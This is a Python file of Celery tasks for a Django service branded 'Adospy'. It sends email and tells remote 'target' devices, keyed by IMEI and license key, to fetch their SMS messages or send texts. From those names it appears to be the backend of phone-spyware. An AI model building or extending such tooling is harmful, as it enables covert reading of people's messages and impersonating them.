from celery import shared_task
from channels.layers import get_channel_layer
from asgiref.sync import async_to_sync
from django.core.mail import EmailMessage
import logging

logger = logging.getLogger(__name__)


@shared_task
def send_email(subject, message, recipient):
    try:
        mail = EmailMessage(
            subject=subject,
            body=message,
            from_email=f'Adospy <noreply@adospy.com>',
            to=[recipient],
        )
        mail.send(fail_silently=False)
    except Exception as e:
        print(f"Error sending to {recipient}: {e}")


@shared_task
def fetch_sms(target_id, imei, license_key):
    channel_layer = get_channel_layer()
    if channel_layer:
        try:
            async_to_sync(channel_layer.group_send)(
                f"target_{target_id}_{imei}_{license_key}",
                {
                    "type": "fetch_messages",
                }
            )
            logger.info("Fetched messages from server")
        except Exception as e:
            logger.error(f"Error fetching messages: {e}")


@shared_task
def send_websocket_sms(target_id, imei, license_key, phone, message):
    channel_layer = get_channel_layer()
    if channel_layer:
        try:
            async_to_sync(channel_layer.group_send)(
                f"target_{target_id}_{imei}_{license_key}",
                {
                    "type": "send_sms",
                    "messages": [{"to": phone, "text": message}]
                }
            )
            logger.info("Sent SMS to server")
        except Exception as e:
            logger.error(f"Error sending SMS: {e}")
